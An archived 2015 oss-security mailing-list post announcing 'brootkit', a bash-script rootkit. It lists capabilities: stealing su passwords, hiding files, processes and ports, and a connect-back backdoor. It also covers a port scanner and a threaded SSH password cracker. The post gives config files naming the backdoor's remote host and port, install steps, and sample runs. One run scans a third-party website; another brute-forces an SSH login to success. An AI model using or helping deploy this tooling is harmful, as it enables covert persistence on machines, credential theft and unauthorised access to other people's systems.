X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5503" "Saturday" "28" "March" "2015" "19:36:05" "+0800" "wzt wzt" "wzt.wzt@gmail.com" "<CAEQi4bf0RO9HymKJhD5M9c0wDv2ZhOwG86hU6JFdsOpKwowd6Q@mail.gmail.com>" "160" "[oss-security] New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10" nil nil nil "3" "2015032811:36:05" "[oss-security] New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10" (number mark "        wzt.wzt@gmai Mar 28  160/5503  " thread-indent "\"[oss-security] New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 21853 invoked by uid 550); 28 Mar 2015 19:35:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 7926 invoked from network); 28 Mar 2015 11:36:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=bman40uEg1dv8964Q3xaesGpnSPzeKtpWtTfNF/PQBA=;
        b=PCYsjw1Z5Cn2cq0t9lx4R+cPAUxsvkvwhHoAxD8ET3KSjLfFTzypziHClgO7BVqDjD
         jU///rKLaasV8hzIi5HKX2HztHYMExnVAazUsAadamiYIrYiOoWSFoKgFfmEqAD3G9qm
         igoIXPszgPeFvnYDxuoJfx5TBuMsnmEaWG1dowTbesRtpaunhzAGAMBCbtPUgjXv5U5w
         h9LPapN3VU7ychFrr2ohFufvqDs1QprSvsyjxfjwvtJQtpGrddr/5twzWQ7AxAjr7JTb
         vxxU8RlOlxosEuzaPhDUnt4DMBYU80NxsGr1EuicQQErpoQVYor65dS/PBXVjn1FBjk2
         ARlA==
MIME-Version: 1.0
X-Received: by 10.112.26.43 with SMTP id i11mr21123963lbg.83.1427542565307;
 Sat, 28 Mar 2015 04:36:05 -0700 (PDT)
Message-ID: <CAEQi4bf0RO9HymKJhD5M9c0wDv2ZhOwG86hU6JFdsOpKwowd6Q@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a1133ef4e81c9d8051257a7f7
Date: Sat, 28 Mar 2015 19:36:05 +0800
From: wzt wzt <wzt.wzt@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10
To: oss-security@lists.openwall.com

--001a1133ef4e81c9d8051257a7f7
Content-Type: text/plain; charset=UTF-8

BROOTKIT
    Lightweight rootkit implemented by bash shell scripts v0.10

    by wzt 2015   wzt.wzt@gmail.com

    If bash shell scripts can be designed for security tools like chkrootkit
    or rkhunter, so it can be implemented for a rootkit.

FEATURES
    1. more hidable ability against admintrator or hids.
    2. su passwd thief.
    3. hide file and directorys.
    4. hide process.
    5. hide network connections.
    6. connect backdoor.
    7. multi thread port scanner.
    8. http download.
    9. multi thread ssh passwd crack.

TARGET OS
    1. centos
    2. rhel
    3. ubuntu
    4. debian
    5. fedroa
    6. freebsd

TODO
    1. sudo thief support.

INSTALL

    Linux distribution systems.

    1. edit br.conf first

      brootkit config file.

      #the ports will be hide: port1,port2,...,portn.
      HIDE_PORT               8080,8899
      #the files will be hide: file1,file2,...,filen.
      HIDE_FILE               br.conf,bashbd.sh,brootkit,.bdrc,brdaemon
      #the process will be hide: process1,process2,...,processn.
      HIDE_PROC               bashbd,brootkit,pty.spawn,brdaemon
      #the connect back host domain name or ip address.
      REMOTE_HOST             localhost
      #the connect back host port.
      REMOTE_PORT             8080
      #the connect backdoor base sleep time.
      SLEEP_TIME              60
    2. ./install.sh

    3. multi thread port scanner.

      [root@localhost brootkit]$ ./brscan.sh
      ./brscan.sh <-p> [-n|-t|-o|-h] <remote_host>

      option:
      -p              ports, pattern: port1,port2,port3-port7,portn...
      -n              thread num, defalut is 10
      -t              timeout, default is 30s
      -o              results write into log file, default is brscan.log
      -h              help information.

      exp:
      ./brscan.sh -p 21,22,23-25,80,135-139,8080 -t 20 www.cloud-sec.org
      ./brscan.sh -p 1-65525 -n 200 -t 20 www.cloud-sec.org

      [root@localhost brootkit]# ./brscan.sh -p 21,22,23-25,80,135-139,8080
-t 5 -n 20 www.wooyun.org
      host: www.wooyun.org | total ports: 10 | thread num: 10 timeout: 5 |
logfile: brscan.log

      thread<0    >           --              pid <57053>     -->     21
      thread<1    >           --              pid <57054>     -->     22
      thread<2    >           --              pid <57055>     -->     23
      thread<3    >           --              pid <57056>     -->     24
      thread<4    >           --              pid <57057>     -->     80
      thread<5    >           --              pid <57058>     -->     135
      thread<6    >           --              pid <57059>     -->     136
      thread<7    >           --              pid <57060>     -->     137
      thread<8    >           --              pid <57061>     -->     138
      thread<9    >           --              pid <57070>     -->     8080

      [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]
10/10     6 s

    www.wooyun.org: 80

    4. multi thread ssh passwd crack.
      [root@localhost brootkit]# ./sshcrack.sh
      ./sshcrack.sh <-h host> <-u user> <-p passwd> [-t timeout] [-n
threadnum] [-o logfile]

      option:
      -h              host name or host list file.
      -u              user name or user list file.
      -p              single passwd or passwd list file.
      -t              connect timeout, defalut is 5s.
      -n              thread num, default is 1.
      -o              log file.
      -v              display help information.

      exp:

      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst
      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2
      ./sshcrack.sh -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2
      ./sshcrack.sh -h host.lst -u user.lst -p passwd.lst -n 10 -t 2

      [root@localhost brootkit]# ./sshcrack.sh -h 192.168.215.148 -u wzt -p
passwd.lst -n 6
      host: 1 | users: 1 | passwd: 28 thread: 6 | timeout: 10 | logfile:
sshcrack.log

      Thread[ 1]      wzt@192.168.215.148             ==>     [e
    ]      [failed]         3
      Thread[ 2]      wzt@192.168.215.148             ==>     [a
    ]      [failed]         3
      Thread[ 3]      wzt@192.168.215.148             ==>     [d
    ]      [failed]         3
      Thread[ 4]      wzt@192.168.215.148             ==>     [giveshell
 ]      [success]     6
      Thread[ 5]      wzt@192.168.215.148             ==>     [123456
 ]      [failed]         3
      Thread[ 6]      wzt@192.168.215.148             ==>     [fd
   ]      [failed]         3

      waiting all threads to finsh...

    Freebsd system
    on the modern freebsd system, root use csh by default, the other users
    use sh default. this version brootkit can only support sh based
features.

    1. edit brsh.conf first

    brshootkit config file, only one argument support.

      #the port will be hide.
      HIDE_PORT               8080
      #the files will be hide file.
      HIDE_FILE               brsh
      #the process will be hide process.
      HIDE_PROC               sh
      #the connect back host domain name or ip address.
      REMOTE_HOST             localhost
      #the connect back host port.
      REMOTE_PORT             8080
      #the connect backdoor base sleep time.
      SLEEP_TIME              60
    2. ./install.sh

SOURCE
    https://github.com/cloudsec/brootkit

--001a1133ef4e81c9d8051257a7f7--
